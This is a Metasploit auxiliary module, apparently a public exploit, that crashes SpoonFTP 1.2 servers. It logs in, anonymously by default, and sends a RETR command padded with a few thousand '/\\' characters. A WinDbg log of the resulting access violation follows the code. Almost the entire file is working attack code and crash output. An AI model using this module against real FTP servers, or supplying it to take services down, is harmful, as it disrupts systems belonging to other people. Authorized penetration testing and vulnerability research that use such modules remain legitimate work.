##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Remote::Ftp
    include Msf::Auxiliary::Dos

    def initialize(info = {})
      super(update_info(info,
        'Name' => 'SpoonFTP <= 1.2 RETR Denial Of Service',
        'Description' => %q{
        This Module exploits a bug found in SpoonFTP 1.2
        of the Denial of Service that occurs when the spooftp receives
        a malformed command RETR it calls the function "AppendQueue()" 
        which causes a READ VIOLATION the movement of a string.
        },
        'Author' => "C4SS!0 G0M3S",
        'License'        => MSF_LICENSE,
        'Version'        => '$Revision$',
        
        'References' =>
        [	
          ['URL','http://packetstormsecurity.org/files/99466/SpoonFTP-1.2-Denial-Of-Service.html'],
          ['URL','http://www.exploit-db.com/exploits/17021/'],
          ['URL','http://www.securityfocus.com/bid/46952'],
        ],
        'DisclosureDate' => 'Apr 03 2011'))
    
    register_options([
      OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
      OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
    ])
     end

  def run
    connect_login
    print_status("Sending Exploit Denial of Service...")
    exploit = "/\\" * (6000/3)
    send_cmd(['RETR',exploit],true)
    print_status("Submitted Exploit Success;-)")
    handler
    disconnect
  end
end


=begin
Microsoft (R) Windows Debugger Version 6.12.0002.633 X86
Copyright (c) Microsoft Corporation. All rights reserved.

CommandLine: "D:\Arquivos de programas\SpoonFTP\ftpd.exe"
Symbol search path is: SRV*d:\simbolos*http://msdl.microsoft.com/download/symbols;SRV*d:\simbolos*http://chromium-browser-symsrv.commondatastorage.googleapis.com;SRV*d:\simbolos*http://symbols.mozilla.org/firefox
Executable search path is: 
ModLoad: 00400000 00432000   image00400000
ModLoad: 7c900000 7c9b6000   ntdll.dll
ModLoad: 7c800000 7c900000   D:\WINDOWS\system32\kernel32.dll
ModLoad: 5d510000 5d5aa000   D:\WINDOWS\system32\COMCTL32.dll
ModLoad: 77f50000 77ffb000   D:\WINDOWS\system32\ADVAPI32.dll
ModLoad: 77db0000 77e43000   D:\WINDOWS\system32\RPCRT4.dll
ModLoad: 77f20000 77f31000   D:\WINDOWS\system32\Secur32.dll
ModLoad: 77e50000 77e99000   D:\WINDOWS\system32\GDI32.dll
ModLoad: 7e360000 7e3f1000   D:\WINDOWS\system32\USER32.dll
ModLoad: 71a90000 71a9a000   D:\WINDOWS\system32\WSOCK32.dll
ModLoad: 71a70000 71a87000   D:\WINDOWS\system32\WS2_32.dll
ModLoad: 77bf0000 77c48000   D:\WINDOWS\system32\msvcrt.dll
ModLoad: 71a60000 71a68000   D:\WINDOWS\system32\WS2HELP.dll
ModLoad: 7c9c0000 7d1de000   D:\WINDOWS\system32\SHELL32.dll
ModLoad: 77ea0000 77f16000   D:\WINDOWS\system32\SHLWAPI.dll
(ec.f60): Break instruction exception - code 80000003 (first chance)
eax=00241eb4 ebx=7ffdb000 ecx=00000007 edx=00000080 esi=00241f48 edi=00241eb4
eip=7c90120e esp=0012fb20 ebp=0012fc94 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ntdll!DbgBreakPoint:
7c90120e cc              int     3
0:000> g
ModLoad: 773b0000 774b3000   D:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll
ModLoad: 5b1c0000 5b1f8000   D:\WINDOWS\system32\uxtheme.dll
ModLoad: 77670000 77691000   D:\WINDOWS\system32\NTMARTA.DLL
ModLoad: 774c0000 775fe000   D:\WINDOWS\system32\ole32.dll
ModLoad: 71bc0000 71bd3000   D:\WINDOWS\system32\SAMLIB.dll
ModLoad: 76f40000 76f6d000   D:\WINDOWS\system32\WLDAP32.dll
ModLoad: 71a10000 71a50000   D:\WINDOWS\system32\mswsock.dll
ModLoad: 60b30000 60b88000   D:\WINDOWS\system32\hnetcfg.dll
ModLoad: 71a50000 71a58000   D:\WINDOWS\System32\wshtcpip.dll
(ec.f70): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=008b4198 ebx=00000000 ecx=3fffeef2 edx=ffffffff esi=0014fe40 edi=00153000
eip=00410291 esp=00b3fb1c ebp=00b3fb28 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010207
*** WARNING: Unable to verify checksum for image00400000
*** ERROR: Module load completed but symbols could not be loaded for image00400000
image00400000+0x10291:
00410291 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:002> u
image00400000+0x10291:
00410291 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
00410293 8bca            mov     ecx,edx
00410295 83e103          and     ecx,3
00410298 f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
0041029a 8b4508          mov     eax,dword ptr [ebp+8]
0041029d 8b4808          mov     ecx,dword ptr [eax+8]
004102a0 51              push    ecx
004102a1 ff15c4a04100    call    dword ptr [image00400000+0x1a0c4 (0041a0c4)]

=end

